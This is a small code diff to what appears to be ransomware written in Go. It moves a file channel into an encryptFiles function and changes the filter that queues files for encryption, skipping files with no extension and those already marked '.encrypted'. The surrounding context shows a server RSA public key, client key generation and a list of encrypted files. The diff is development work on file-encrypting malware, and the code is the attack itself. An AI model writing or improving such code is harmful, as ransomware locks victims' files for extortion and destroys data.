@@ -15,7 +15,6 @@ import (
 )
 
 var (
-	filesToVisit  = make(chan io.File)
 	encryptedList []string
 	waitGroup     sync.WaitGroup
 	sPubKey       = rsaLib.DecodeRSAPublicKey(utils.SPubKeyPem)
@@ -67,6 +66,7 @@ func generateClientKeys(servPubKey *rsa.PublicKey) (*rsa.PublicKey, error) {
 
 func encryptFiles(dirPath string, cPubKey *rsa.PublicKey) {
 
+	var filesToVisit = make(chan io.File)
 	var ext string
 	var err error
 
@@ -87,7 +87,7 @@ func encryptFiles(dirPath string, cPubKey *rsa.PublicKey) {
 					return err
 				}
 				ext = filepath.Ext(path)
-				if ext != ".encrypted" {
+				if len(ext) > 1 && ext != ".encrypted" {
 					filesToVisit <- io.File{Info: info, Path: path, Extension: ext[1:]}
 				}
 			}
